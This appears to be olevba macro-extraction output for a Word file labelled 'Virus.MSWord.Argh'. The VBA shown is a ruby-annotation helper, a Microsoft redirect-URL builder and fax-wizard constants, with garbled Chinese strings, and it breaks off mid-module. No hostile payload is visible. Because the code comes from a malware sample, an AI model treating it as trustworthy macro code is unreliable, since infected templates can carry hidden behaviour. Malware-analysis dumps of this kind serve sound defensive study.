olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Argh
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Argh - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO UC01.cls 
in file: Virus.MSWord.Argh - OLE stream: 'Macros/VBA/UC01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Const SZ_MACRONAME = "¨Ã¦C¤å¦r"

Sub Insert()
    With Selection
        If Len(.Text) = 1 And .Text = (Chr$(13)) Then
            MsgBox "½Ð¥ý¿ï¨ú­n¨Ã¦Cªº¤å¦r¡A¦A¿ï¨ú¥»¥\¯à¿ï¶µ¡C", _
                    Title:=SZ_MACRONAME
            GoTo LExit:
        End If
        If ((.Start = .End) And (.Text = Chr$(21))) Then
            .MoveRight , 1, 1
        End If
        If (Right$(.Text, 1) = Chr$(13)) Then
            .End = .End - 1
        End If
        If (FIsRubyField(.Range) = False) Then
            If (.Range.Fields.Count > 0) Or (InStr(1, .Text, Chr$(13)) <> 0) _
                Or (InStr(1, .Text, vbTab) <> 0) Or (InStr(1, .Text, ",") <> 0) _
                Or (InStr(1, .Text, "(") <> 0) Or (InStr(1, .Text, vbTab) <> 0) Then
                MsgBox "µLªk¬°§t¦³©w¦ìÂI¡B¥\¯àÅÜ¼Æ©M¬q¸¨²Å¸¹ªº¦r¦ê¥[¤J¨Ã¦Cªºµù¸Ñ", Title:=SZ_MACRONAME
                GoTo LExit:
            End If
        End If
        If (Selection.Start = Selection.End) Then
            MsgBox "½Ð¿ï¨ú­n¥[¤Jµù¸Ñªº¦r¦ê", Title:=SZ_MACRONAME
            GoTo LExit:
        End If
    End With
    InitDialog
    dlgRuby.Show
LExit:
End Sub

Sub Create(szRuby As String, szFont As String, iSize As Integer, iDist As Integer, szAlign As String)
    Dim rgn As Range
    Dim n As Integer
    Dim iCurSize As Integer
    Dim szCurFont As String
    Dim fnt As Font
    Application.ScreenUpdating = False
    System.Cursor = wdCursorWait
    
    On Error GoTo LError
    With Selection
        Set rgn = .Range
        Set fnt = GetCurFont(rgn)
        If (FIsRubyField(rgn) = True) Then
            Delete
        End If

        iCurSize = fnt.Size
        szCurFont = fnt.Name
        n = Len(.Text)
        
        ' Insert Field
        .Fields.Add .Range, , , False
        .TypeText "eq \o"
        
        ' Ruby string align
        Select Case (szAlign)
        Case "¾a¥ª"
            .TypeText "\al"
        Case "µ¥¶¡¶Z®i¶}"
            .TypeText "\ad"
        Case Else
        End Select
        
        .TypeText "(\s\up" + Str$(Int(iDist + .Font.Size - 1)) + "("
        .InsertBefore szRuby
        .Font.Size = iSize
        .Font.Name = szFont
        .Font.DisableCharacterSpaceGrid = False
        .MoveRight
        .InsertAfter "),"
        .Font.Size = iCurSize
        .Font.Name = szCurName
        .MoveRight , n + 2
        .TypeText ")"
        ' Kludge, To remove space char at end of field....
        .MoveLeft , 2
        .Delete unit:=wdCharacter, Count:=1
        
        .Fields.ToggleShowCodes
        .MoveRight , 1, 1
        
    End With
LExit:
    Application.ScreenUpdating = True
    System.Cursor = wdCursorNormal
    Exit Sub
LError:
    MsgBox Err.Description, Title:=SZ_MACRONAME
End Sub

Sub Delete()
    Dim rgn As Range
    Dim rgnFld As Range
    Dim rgnNew As Range
    Dim szCode As String
    Dim FUpdate As Boolean
    
    On Error GoTo LError
    If (Application.ScreenUpdating = True) Then
        FUpdate = True
        Application.ScreenUpdating = False
        System.Cursor = wdCursorWait
    Else
        FUpdate = False
    End If
    
    With Selection
        Set rgn = .Range
        If (.Fields.Count < 1) Then GoTo LExit:
        For i = 1 To .Fields.Count
            szCode = rgn.Fields(i).Code
            Set rgnFld = rgn.Fields(i).Code
            If (FIsRubyField(rgn) = False) Then
                GoTo LExit:
            End If
            
            iTop = InStr(1, szCode, ",") + rgnFld.Start
            iEnd = rgnFld.End - 1
            rgnFld.SetRange iTop, iEnd
            
            .MoveLeft
            Set rgnNew = Selection.Range
            rgnNew.FormattedText = rgnFld.FormattedText
            .MoveRight , Len(rgnFld.Text)
            .MoveRight , 1, 1
            .Delete
            rgnNew.Select
            
        Next i
    End With
LExit:
    If (FUpdate = True) Then
        Application.ScreenUpdating = True
        System.Cursor = wdCursorNormal
    End If
    Exit Sub
LError:
    MsgBox Err.Description, Title:=SZ_MACRONAME
End Sub

Sub InitDialog()
    Dim i As Integer
    Dim n As Integer
    Dim szFont As String
    Dim szCode As String
    Dim fnt As Font
    Dim fntRuby As Font
    
    On Error GoTo LError:
    Application.ScreenUpdating = False
    System.Cursor = wdCursorWait

    dlgRuby.IDCD_ALIGN.Clear
    dlgRuby.IDCD_ALIGN.AddItem "¾a¥ª"
    dlgRuby.IDCD_ALIGN.AddItem "¸m¤¤"
    dlgRuby.IDCD_ALIGN.AddItem "µ¥¶¡¶Z®i¶}"
    
    With Selection
        Set fnt = GetCurFont(.Range)
        If (FIsRubyField(.Range) = True) Then
            dlgRuby.ID_RESET.Enabled = True
            ' Get Selected Field Values
            ' { eq \o\ad(\s\up 12(foo),bar) }
            Dim rgn As Range
            .Fields(1).Select
            Set rgn = .Fields(1).Code
            szCode = .Fields(1).Code.Text
            
            ' { eq \o\ad(\s\up 12(foo),bar) }
            '                     ~~~
            iTop = InStr(11, szCode, "(")
            iEnd = InStr(1, szCode, ",") - 2
            Set rgn = .Fields(1).Code
            rgn.SetRange rgn.Start + iTop, rgn.Start + iEnd
            Set fntRuby = GetCurFont(rgn)
            dlgRuby.IDCT_FONT.Caption = fntRuby.NameFarEast
            dlgRuby.IDCT_SIZE.Caption = fntRuby.Size
            dlgRuby.IDCE_TEXT = rgn.Text
            
            ' { eq \o\ad(\s\up 12(foo),bar) }
            '                  ~~
            iTop = InStr(1, szCode, "up ") + 2
            iEnd = InStr(11, szCode, "(")
            Set rgn = .Fields(1).Code
            rgn.SetRange rgn.Start + iTop, rgn.Start + iEnd
            dlgRuby.IDCE_DIST = Val(Mid$(szCode, iTop, iEnd - iTop)) - Int(fnt.Size) + 1
            
            ' { eq \o\ad(\s\up 12(foo),bar) }
            '        ~~~
            If (InStr(1, szCode, "\al") > 0) Then
                dlgRuby.IDCD_ALIGN.ListIndex = 0
            ElseIf (InStr(1, szCode, "\ad") > 0) Then
                dlgRuby.IDCD_ALIGN.ListIndex = 2
            Else
                dlgRuby.IDCD_ALIGN.ListIndex = 1
            End If
        Else
            dlgRuby.ID_RESET.Enabled = False
            dlgRuby.IDCE_TEXT = ""
            dlgRuby.IDCE_DIST = Str$(0)
            dlgRuby.IDCT_SIZE.Caption = Int(fnt.Size / 2)
            dlgRuby.IDCT_FONT.Caption = fnt.NameFarEast
            dlgRuby.IDCD_ALIGN.ListIndex = 1
        End If
        dlgRuby.IDCE_TEXT.IMEMode = fmIMEModeNoControl
        dlgRuby.IDCE_TEXT.SetFocus
        dlgRuby.IDCE_TEXT.SelStart = 0
        dlgRuby.IDCE_TEXT.SelLength = 99
        If (dlgRuby.IDCE_TEXT.Text <> "") Then
            dlgRuby.IDOK.Enabled = True
        Else
            dlgRuby.IDOK.Enabled = False
        End If
    End With

    Application.ScreenUpdating = True
    System.Cursor = wdCursorNormal
    Exit Sub
LError:
    MsgBox Err.Description, Title:=SZ_MACRONAME
End Sub

Function FIsRubyField(rgn As Range) As Boolean
    FIsRubyField = False
    If (rgn.Fields.Count = 0) Then Exit Function
    a$ = rgn.Fields(1).Code.Text
    ' { eq \o\ad(\s\up 12(foo),bar) }
    '   ~~~~~   ~~~~~~ and "),\s\do" is only contained Kumimoji field
    If (Left$(a$, 6) = " eq \o") And (InStr(6, a$, "(\s\up") <> 0) And (InStr(9, a$, "),\s\do") = 0) _
        And (Right$(a$, 1) = ")") Then
        FIsRubyField = True
    End If
End Function


Function BuildRedirString$()

Dim RedirString$
Dim Arg$(0 To 11)
Dim OS As String

Select Case System.OperatingSystem
Case "Windows"
  OS = "Win"
Case "Windows NT"
  OS = "WinNT"
Case "Macintosh"
  OS = "Mac"
Case Else
  OS = "Win"
End Select

RedirString$ = "http://www.microsoft.com/isapi/redir.dll?"

Arg$(0) = "PRD=Word"
Arg$(1) = "&SBP=ia"
Arg$(2) = "&PLCID=" & Application.International(wdProductLanguageID)
Arg$(3) = "&PVER=" & Application.Version
Arg$(4) = "&OS=" & OS
Arg$(5) = "&OVER=" & System.Version
Arg$(6) = "&OLCID=" 'intentionally left blank
Arg$(7) = "&CLCID=" & "0x" & System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\International", "Locale")
Arg$(8) = "&AR=templates"
Arg$(9) = "&O1="
Arg$(10) = "&O2="
Arg$(11) = "&O3="


For i = 0 To 11
  RedirString$ = RedirString$ & Arg$(i)
Next

BuildRedirString$ = RedirString$

End Function

Sub UpdateLink()
    Dim Anchor As Range
    For Each Hlink In ActiveDocument.Hyperlinks 'look at all hyperlinks in doc
        If Hlink.Address = "http://www.microsoft.com/isapi/redir.dll?PRD=Word&SBP=ia&PVER=8.0&AR=templates" Then 'look for address to change
            If Hlink.Type = msoHyperlinkRange Then 'get Anchor - Text Or Shape
                Set Anchor = Hlink.Range        'text anchor
            Else
                Set Anchor = Hlink.Shape        'shape anchor
            End If
            Hlink.Delete            'delete old link
            ActiveDocument.Hyperlinks.Add Anchor, BuildRedirString()  'add new hlink in same place
        End If
    Next
End Sub

Option Explicit

'Standard Claimer

''******************************************************************************
'TO BE LOCALIZED
''******************************************************************************
'Style names
Public Const strSTY_RETURN_ADDR     As String = "Return Address"
Public Const strSTY_DOC_LABEL       As String = "Document Label"
Public Const strSTY_COMPANY_NAME    As String = "Company Name"
Public Const strSTY_MSG_HDR_FIRST   As String = "Message Header First"
Public Const strSTY_MSG_HDR_LABEL   As String = "Message Header Label"
Public Const strSTY_MSG_HDR_LAST    As String = "Message Header Last"

'misc strings
Public Const strPHONE   As String = "¹q¸Ü¡G"
Public Const strFAX     As String = "¶Ç¯u¹q¸Ü¡G"
Public Const strPAGES   As String = "Á`­¶¼Æ¡G"
Public Const strTO      As String = "¦¬¥óªÌ¡G"
Public Const strFROM    As String = "±H¥óªÌ¡G"
Public Const strDATE    As String = "¤é´Á¡G"
Public Const strRE      As String = "¥D¦®¡G"
Public Const strCC      As String = "ªþ¥»¡G"

Public Const strCOMPANY         As String = "¤½¥q¦æ¸¹¡G"
Public Const strFAX_NUMBER      As String = "¶Ç¯u¹q¸Ü¡G"
Public Const strPHONE_NUMBER    As String = "¹q¸Ü¡G"
Public Const strTOTAL_NO_PAGES  As String = "¥]§t«Ê­±¦b¤ºÁ`¦@­¶¼Æ¡G"

Public Const strEMPTY_MACRO As String = "EmptyMacro "
Public Const strNONE        As String = "<None>" 'choice to list of merge field
                                                 'names found in data source
                                'doc. if there is no field for last name.
                                'if the user selected this choice we don't
                                'insert a merge field for last name in the cover sheet.
Public Const strFLD_NAME As String = "Name" 'to select the field containing recipient name
                                    'from the fields present in the data source
Public Const strFLD_FAX As String = "Fax" 'to select the merge field containing fax number

Public Const strCLICK_HERE_NAME     As String = "[«ö¤@¤U³o¸Ì¿é¤J©m¦W]"
Public Const strCLICK_HERE_PAGES    As String = "[«ö¤@¤U³o¸Ì¿é¤J¶Ç¯u­¶¼Æ]"
Public Const strCLICK_HERE_SUBJECT  As String = "[«ö¤@¤U³o¸Ì¿é¤J¶Ç¯u¥D¦®]"
Public Const strCLICK_HERE_COMMENTS As String = "[«ö¤@¤U³o¸Ì¿é¤J¥²­nªºµù°O]"
Public Const strCLICK_HERE_COMPANY  As String = "[«ö¤@¤U³o¸Ì¿é¤J¤½¥q¦WºÙ]"
Public Const strCLICK_HERE_PHONE_NUMBER As String = "[«ö¤@¤U³o¸Ì¿é¤J¹q¸Ü]"
Public Const strCLICK_HERE_FAX_NUMBER As String = "[«ö¤@¤U³o¸Ì¿é¤J¶Ç¯u¹q¸Ü]"

'Address format to get info. from the Address book. Please be careful about the commas and
'spaces since you might end up with a space at the beginning of a name if not put at the right place.
'Please change the names only if you know the correct one.
Public Const strADDR_BK_NAME_FORMAT As String = "{{<PR_GIVEN_NAME> }{<PR_SURNAME>}|<PR_DISPLAY_NAME>}"
Public Const strADDR_BK_ADDR_FORMAT As String = "{<PR_POSTAL_ADDRESS>|{<PR_STREET_ADDRESS>" & vbCr & "}{<PR_LOCALITY>}{, {<PR_STATE_OR_PROVINCE> }<PR_POSTAL_CODE>}}"
Public Const strADDR_BK_FAXNUM_FORMAT As String = "{<PR_PRIMARY_FAX_NUMBER>|<PR_BUSINESS_FAX_NUMBER>|<PR_HOME_FAX_NUMBER>}"
Public Const strADDR_BK_PHONE_FORMAT As String = "{<PR_PRIMARY_TELEPHONE_NUMBER>|<PR_BUSINESS_TELEPHONE_NUMBER>|<PR_OFFICE_TELEPHONE_NUMBER>}"
Public Const strADDR_BK_COMPANY_FORMAT As String = "{<PR_COMPANY_NAME>}"

'status messages put up while faxing the cover sheet and document. For some messages
'I add "..." and so add "..." to all strings.
Public Const strFAXING_DOC_RECIPIENTS As String = "¥¿¦b¶Ç¯u³o¥÷¤å¥óµ¹©Ò¦³¦¬¥óªÌ..."
Public Const strFAXING_DOC_RECIPIENT As String = "¥¿¦b¶Ç¯u³o¥÷¤å¥óµ¹¦¬¥óªÌ"
Public Const strFAXING_CS_RECIPIENTS As String = "¥¿¦b¶Ç¯u«Ê­±µ¹©Ò¦³¦¬¥óªÌ..."
Public Const strFAXING_CS_RECIPIENT As String = "¥¿¦b¶Ç¯u«Ê­±µ¹©Ò¦³¦¬¥óªÌ"
Public Const strFAXING_CS_TO As String = "¥¿¦b¶Ç¯u«Ê­±¨ì"
Public Const strFAXING_DOC_TO As String = "¥¿¦b¶Ç¯u¤å¥ó¨ì"

'the text in the last panel
'the first one is the default. The next string is used if the user selects no cover sheet, when
'we actually send the fax on clicking Finish
Public Const strLAST_PANEL_DFLT_TEXT As String = "¦pªG°õ¦æºëÆF¦³°ÝÃDªº¸Ü¡A½Ð­«·s°õ¦æ¶Ç¯uºëÆF¡AÀË¬d¿é¤J¶Ç¯u¹q¸Üªº®æ¦¡¬O§_¥¿½T¡C¨Ò¦p¡A±z¬O¤£¬O§Ñ¤F¶Q¤½¥qªº¹q¸Ü¨t²Î¦b¼·¥~½u«e¡A»Ý¥ý«ö­ÓÁä¡A¤ñ¦p»¡¼Æ¦rÁä¡u9¡v¡C­n°O±o¥[¶i¶Ç¯u¹q¸Ü¤¤³á¡I"
Public Const strLAST_PANEL_NOCOVSHT_TEXT As String = "©Ò¦³¸ê®Æ¤w¿é¤J§¹²¦¡A«ö¤@¤U§¹¦¨Áä¡AºëÆF±N°e¥X±zªº¶Ç¯u¤å¥ó¡I"

'strings necessary to display help in case of failure of Fax
Public Const strHLP_FAX_INSTALL As String = "¦pªG±z²{¦b°õ¦æªº¬O Windows 95¡A²{¦b±z´N¥i¥H¦w¸Ë¥»ºëÆF¤F¡C«ö¤U½T©wÁä¡A¿Ã¹õ¤W±N·|¥X²{»²§U»¡©ú¤å¥ó¡A§i¶D±z¦p¦ó¦w¸ËºëÆF¡I"
'the next string is the title as it appears on Word's main window
Public Const strMS_WORD As String = "Microsoft Word"

'make sure that strCMD_BAR_TITLE is as long as strCMD_BTN_TEXT, so that strCMD_BTN_TITLE does not get clipped off
'when the command bar is displayed.
Public Const strCMD_BAR_TITLE   As String = "¤¤¤å¶Ç¯uºëÆF"
Public Const strCMD_BTN_TEXT    As String = "²{¦b°e¥X¶Ç¯u"

Public Const strCURRENT_DOC     As String = "¥Ø«eªº¤å¥ó("
Public Const strRIGHT_PAREN     As String = ")"

'Window caption of the cover sheet (the document's name will follow if the user is faxing a document)
Public Const strWINDOW_CAPTION  As String = "ªº¶Ç¯u«Ê­±ªí³æ"
'Window caption if user is not faxing a doc. and just created a cover sheet.
Public Const strCOVER_SHEET_CAPTION As String = " - ¶Ç¯u«Ê­±ªí³æ"

'Text in merge fields inserted in the cover sheet
Public Const strFLD_FAX_NAME    As String = "Name"
Public Const strFLD_FAX_NUMBER  As String = "FaxNumber"

'In NT3.51, the printer name from the print set up dialog which is called when the user clicks on
'Other... , returns the printer name with the printer location after ON
'so if a printer name is \\abcd\efg with location "location1" then the printer
'name is returned a "\\abcd\efg ON location1. So we have to strip out the text
'after ON. That's what this constant is for. In other countries too is this text
'going to be ON?
Public Const strPRINTER_ON      As String = " ON "

Public Const iMAX_ADDR_LINES = 3 'max. # of lines address can have
'Error messages
Public Const strERR_MAX_ADDR_LINES  As String = "¦a§}¤£¥i¶W¹L¤T¦æ¡C"
Public Const strERR_NO_DATA_SRC     As String = "ºëÆF§ä¤£¨ì­n¶Ç¯uªº¤å¥ó¡C"
Public Const strERR_CREATING_CMDBAR As String = "ºëÆFµLªk«Ø¥ß¡uSend Fax¡v¤u¨ã¦C¡C ½Ð­«·s°õ¦æ¶Ç¯uºëÆF¡C"
Public Const strERR_NO_MAIN_DOC1     As String = "­n«Ø¥ß«Ê­±ªí³æªº¤å¥ó ("
Public Const strERR_NO_MAIN_DOC2     As String = ") ¥¼¶}±Ò¡C½Ð¥ý¶}±Ò¸Ó¤å¥ó¡AµM«á­«·s°õ¦æºëÆF¡I"
Public Const strERR_DISPLAY_QUERY_OPTIONS As String = "ºëÆF§ä¤£¨ì­n¥[¤Jªº¸ê®Æ¡C"
Public Const strERR_CHOOSING_DOC As String = "ºëÆFµLªk¿ï¨ú­n¥Î¨Ó¶Ç¯uªº¤å¥ó¡C"
Public Const strERR_RCPNTS_NOT_CHOSEN As String = "ºëÆF»Ý­nª¾¹D³o¥÷ªº¦¬¥óªÌ¬O½Ö¡C½Ð«ö¤U¡u½T©w¡v¶s¡AµM«á¿ï¨ú¶Ç¯uªº¦¬¥óªÌ¡C"

'this tip is displayed in an Autodown balloon finally
Public Const strPOST_WIZARD_TIP_NO_MRG_FLD As String = "½Ð¿é¤J¨ä¥¦±z·Q¼g¦b«Ê­±ªí³æ¤Wªº¸ê®Æ¡AµM«á«ö¤U¦b " & strCMD_BAR_TITLE & " ¤u¥y¦C¤Wªº¡u" & strCMD_BTN_TEXT & "¡v¶s¡C "
'this tip is displayed if we inserted merge fields in the cover sheet i.e. in the case of multiple recipients
Public Const strPOST_WIZARD_TIP_MRG_FLD As String = "½Ð¿é¤J¨ä¥¦±z·Q¼g¦b«Ê­±ªí³æ¤Wªº¸ê®Æ¡AµM«á«ö¤U¦b " & strCMD_BAR_TITLE & " ¤u¥y¦C¤Wªº¡u" & strCMD_BTN_TEXT & "¡v¶s¡C " & "¦ý½Ð¤£­n§R°£¦b¡u<< >>¡v²Å¸¹¤¤ªºÄæ¦ì¡Fµy«á¶Ç¯uºëÆF±N§Q¥Î¥L­Ì¨Ó¶Ç¯u±z«ü©wªº¤å¥ó¨ì¦¬¥óªÌ¤â¤W¡C"

'this message is put up after we successfully faxed everything
Public Const strMSG_FAX_SUCCESS As String = "ºëÆF¤w±N±zªº¤å¥ó°e¥X¥h¤F¡C"

'the 72 factor in the below 2 measurements is conversion factor of inches to points
'contemporary styles have a left indent of 0.56"
Public Const sCONT_LEFT_INDENT As Single = 0.56 * 72
'While converting text to table, for the Contemporary style alone,
'I need to set the first column's width explicitly. For English text,
'0.5" is big enough. If the text in the first column is getting truncated
'in your language, then please increase this value.
Public Const sCONT_WIDTH_COL1 As Single = 2.36 * 72

'The date format need not be localized if VB does not require it.
'Medium date is of the format "02-Apr-94". If the standard date format
'is anything different in the country, then please change it.
'important to have MMMM and not mmmm, since mm refers to minutes in a time field
Public Const strDATE_FORMAT As String = "MMMM d, yyyy"

''******************************************************************************
'DO NOT LOCALIZE THE CONSTANTS/DECLARATIONS BEYOND THIS
''******************************************************************************
'the following are the names of the autotext entries in the wizard.
'DON'T CHANGE THE NAMES OF THE AUTOTEXT ENTRIES IN THE WIZARD.
'if you change them, then please change the following strings too, correspondingly
Public Const strAT_UNCHKD_BOX   As String = "Unchecked Box"
Public Const strAT_CHKD_BOX     As String = "Checked Box"
Public Const strCNTMPGFX2        As String = "cntmpgfx2"
Public Const strPOST_WIZ_BLN    As String = "Fax Post Wizard Balloon"

Public Const sA4_LEFT_MARGIN    As Single = 82.08
Public Const sA4_RIGHT_MARGIN    As Single = 81.36
Public Const sLETTER_MARGIN     As Single = 90
'key where setup writes company name
Public Const strREGKEY_CMPNY_NAME As String = "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
Public Const strVALKEY_CMPNY_NAME As String = "DefCompany"

Public fDocChanged As Boolean 'set if user changes the doc. to be faxed

Public objMainDoc As Document 'main doc which has to be sent
Public objDataSrc As MailMergeDataSource ' main doc's data src

'SQL query used to select all names from the data source
Public Const strSELECT_QUERY As String = "Select * From "

'form and callback balloon constants
Public Const iMAX_PANEL As Integer = 6 'panel # of the last panel in
                             'the dialog (starts from 0)
Public rgstrAssistantMsg(iMAX_PANEL) As String   ' as many as there are states

Public strBULLET     As String
Public strSOFT_ENTER As String
Public rgstrNotes(3) As String
Public strQUOTE As String
'available styles
Public Const iSTY_PROFESSIONAL  As Integer = 0
Public Const iSTY_CONTEMPORARY  As Integer = 1
Public Const iSTY_ELEGANT       As Integer = 2

'array for holding long and short template names
Public rgstrTemplateFileNames(3, 3) As String
Public Const iLONG_NAME As Integer = 0
Public Const iSHORT_NAME As Integer = 1

Public iFaxStyle As Integer 'stores the fax style chosen
Public fStylesCopied As Boolean

Public fMSFAXEnabled As Boolean 'disabled in NT

'Panel numbers
Public Const iPANEL_RCPNTS As Integer = 3
Public Const iPANEL_SENDER As Integer = 5
Public Const iPANEL_STYLE  As Integer = 4

'Max. number of recipients
Public Const iMAX_RCPNTS As Integer = 5

Public fDocIsFormLtr As Boolean 'true if doc. is a form letter
'to store the data options query that the user selects for the form letter
Public strFormLetterSQL As String
Public strFormLetterSQL1 As String
Public strConnectString As String
Public fDocPresent   As Boolean 'true if there is an main doc. apart
                                'from the doc created by FileNew
'keeps track of which panel to be skipped.
'if we are enabling a panel, then we need to restore the shape's
'color to as it was before. rgiColorShape stores that color
Public rgfSkipPanel(iMAX_PANEL) As Boolean 'if rgfSkipPanel(i) is True,
                                            'then skip the ith panel
Public rgiColorShape(iMAX_PANEL) As Long
Public fCheckValidity As Boolean
Public fNoCovSht As Boolean 'False if user selects "No cover sheet"

Public iFaxOption       As Integer 'Fax program selected by the user
Public Const iMS_FAX    As Integer = 0  'Microsoft Fax
Public Const iDIFF_FAX  As Integer = 1  'Other than MS Fax
Public Const iNO_FAX    As Integer = 2  'just print without faxing the doc/cover sheet

Public fRegistryNamesRead As Boolean 'true if MRU list has been read from reg.

Dim rgstrFaxTitle(3)        As String
Dim rgstrChkBoxText(5)      As String 'text beside the check boxes
Public strAsstMsgRcpntsFormLtr As String 'assistant help for form letter recipients' panel
Public strAsstMsgRcpntsOrdDoc As String 'assistant help for ordinary doc. recipients' panel

'tip displayed in an autodown balloon after the wizard is done
Public fCreatedCmdBar           As Boolean 'tip is to be displayed only if cmd bar created

'arrays to get the MRU list of recipient names and numbers stored in the registry
Dim rgstrMRUFaxNames(iMAX_RCPNTS) As String
Dim rgstrMRUFaxNums(iMAX_RCPNTS)  As String

'arrays to get the recipients names and numbers that the user entered
Dim rgstrRcpntFaxNames(iMAX_RCPNTS) As String
Dim rgstrRcpntFaxNums(iMAX_RCPNTS)  As String
Public iNumRcpnts As Integer

'DO NOT LOCALIZE - CONTROL NAMES
Public Const strCBO_RCPNT_NAME  As String = "cboRcpntName"
Public Const strCBO_RCPNT_NUM   As String = "cboRcpntNum"
Public iCboRcpntNameFocus       As Integer

'DO NOT LOCALIZE - REGISTRY ENTRIES
Public Const strRCPNT_NAME      As String = "Name of recipient#"
Public Const strRCPNT_NUMBER    As String = "Number of recipient#"
Public Const strNUM_RCPNTS      As String = "Number of recipients"

'Help files
Public Const strWIN_HELP_FILE As String = "Windows.hlp"
Public Const strFAX_HELP_FILE As String = "awfax.hlp"

'contexts for the help
Public Const lCNTXT_FAX_INSTALL As Long = 461903903
Public Const lCNTXT_FAX_SEND As Long = 1698757633
Public Const HELP_COMMAND As Integer = 258 'hex value = 0x0102

'error number that word returns on fax not being installed
Public Const iERR_FAX_NOT_INSTALLED As Integer = 5663
Public Const iERR_FAX_NOT_SENT As Integer = 4559

'DO NOT LOCALIZE - REGISTRY ENTRIES REGARDING PRINTERS
Declare Function RegEnumKey Lib "advapi32.dll" Alias "RegEnumKeyA" _
(ByVal hKey As Long, ByVal dwIndex As Long, ByVal lpName As String, ByVal cbName As Long) As Long

Declare Function RegOpenKey Lib "advapi32.dll" Alias "RegOpenKeyA" _
(ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long

Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long

Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal strDir As String, ByVal uSize As Integer) _
As Integer

Declare Function FindWindow Lib "USER32" Alias "FindWindowA" (ByVal strWndClassName As String, _
ByVal strWndName As String) As Long

Declare Function WinHelp Lib "USER32" Alias "WinHelpA" (ByVal hwnd As Long, ByVal strFileName As String, _
ByVal wCmd As Integer, ByVal dwData As Any) As Integer


Public rgstrPrinterNames()  As String
Public iTotalNumPrinters    As Integer

Const HKEY_LOCAL_MACHINE As Long = &H80000002
'Const KEY_ALL_ACCESS As Long = &HF0063
Const ERROR_SUCCESS As Long = 0
Const ERROR_NO_MORE_ITEMS As Long = 259

'registry keys under which printer names are found
Const strREG_PROVIDERS As String = "System\CurrentControlSet\Control\Print\Providers\"
Const strREG_LOCAL_PRINTERS As String = "System\CurrentControlSet\Control\Print\Printers\"

'initialise the vars. whiehc refer to the wizard's name
Public Sub InitWizardName(fDummy As Boolean)
    
    strWizName = "¤¤¤å¶Ç¯uºëÆF"
    strWizLongName = "¤¤¤å¶Ç¯uºëÆF"
    strWizShortName = "CFax1"

End Sub

'initialize strings specific to this wizard
Private Sub InitWizardStrings()
Dim i As Integer
    
    'fax title for the different styles
    rgstrFaxTitle(iSTY_CONTEMPORARY) = "¶Ç¯u«H¥ó"
    rgstrFaxTitle(iSTY_ELEGANT) = "¶Ç¯u«H¥óªí³æ"
    rgstrFaxTitle(iSTY_PROFESSIONAL) = "¶Ç¯u"
    
    'text appearing after the unchecked boxes
    rgstrChkBoxText(1) = "«æ¥ó"
    rgstrChkBoxText(2) = "½Ð¬d¾\"
    rgstrChkBoxText(3) = "½Ð§å¥Ü"
    rgstrChkBoxText(4) = "½Ð¦^ÂÐ"
    rgstrChkBoxText(5) = "½Ð¶Ç¾\"
    
    'Assistant messages
    rgstrAssistantMsg(0) = "¨Ï¥Î¶Ç¯uºëÆF¡A±z¥i¥H¶Ç¯u¹q¤l¶l¥ó¡A±N«H¥ó¦X¨Ö¨ì¶Ç¯u¤å¥ó¤¤¤@°_¶Ç¯u¡A ©Î±q¶Ç¯u¾÷¤¤¦L¥X¤@±i«Ê­±ªí³æ¡C"
    rgstrAssistantMsg(1) = "¦pªG±z·Q­n¶Ç¯u¨ä¥¦¤å¥ó¡A½Ð¥ý¶}±Ò±z·Q­n¶Ç¯uªº¤å¥ó¡AµM«á¦A°õ¦æ¶Ç¯uºëÆF¡C"
    rgstrAssistantMsg(2) = "¦pªG±zªº§@·~¨t²Î¬O Windows NT¡A«h±zµLªk¨Ï¥Î Microsoft ¶Ç¯u¡A¦ý¬O±zÁÙ¬O¥i¥H¨Ï¥Î¨ä¥¦¤w¦w¸Ë¦b¨t²Î¤¤ªº¶Ç¯u³nÅé¨Ó¬°±z¶Ç¯u¡C¦pªG±zªº¨t²Î¤£¤ä´©¶Ç¯u¥\¯àªº¸Ü¡A¨SÃö«Y¡A±z¥i¥H¥ý±N¤å¥ó¦C¦L¥X¨Ó¡AµM«á¦A§Q¥Î¶Ç¯u¾÷±N¤å¥ó¶Ç¯u¥X¥h¡C"
    rgstrAssistantMsg(iPANEL_RCPNTS) = "¦pªG±z´¿¥Î¹L¶Ç¯uºëÆF¡A«h¤U©Ô¦¡²M³æ¤è¶ô¤¤·|¦C¥X±z³Ìªñ¶Ç¯u¹Lªº¤å¥ó¦WºÙ¡C ±z¥i¥H¦b²M³æ¤¤¿ï¨ú¶Ç¯u¹Lªº¤å¥ó¡A±N¨äªþ¦b±zªº«Ê­±ªí³æ¤§«á¤@°_¶Ç¯u¥X¥h¡C"
    rgstrAssistantMsg(iPANEL_SENDER) = "½Ð¿é¤J±z·Q¼g¦b«Ê­±ªí³æ¤W¦³Ãö°e¥óªÌªº¸ê®Æ¡C"
    rgstrAssistantMsg(iPANEL_STYLE) = "½Ð¿ï¨ú±z«Ê­±ªí³æ©Ò­nªº®æ¦¡¡C¦b¶Ç¯u¤§«e¡A±zÁÙ¬O¥i¥H§ïÅÜ«Ê­±ªí³æªº¥~Æ[¡A©Î¬O¥[¤J¥²­nªºµù°O¡C"
    rgstrAssistantMsg(iMAX_PANEL) = "­n­×§ï¥ô¦ó³]©w¡A½Ð«ö¡u¤W¤@¨B¡v¡C"
    'if user is faxing a form letter, we have a different set of controls in the Recipients panel. So, we change the help text too.
    strAsstMsgRcpntsFormLtr = "½ÐÂI¨ú¡u©m¦W¡vÄæ¦ì¡A¦A¨Ó½ÐÂI¨ú¡u¶Ç¯u¹q¸Ü¡vÄæ¦ì¡A µM«á±q³q°T¿ý¤¤¿ï¨ú­n¥[¤Jªº¦¬¥ó¤H©Î¨ä¶Ç¯u¹q¸Ü¡C ±z¥i¥H¿ï¾Ü¶Ç¯uµ¹¨C¤@­Ó¤H©Î¬O«ü©w¥u¶Ç¯uµ¹¬Y¤H¡C"
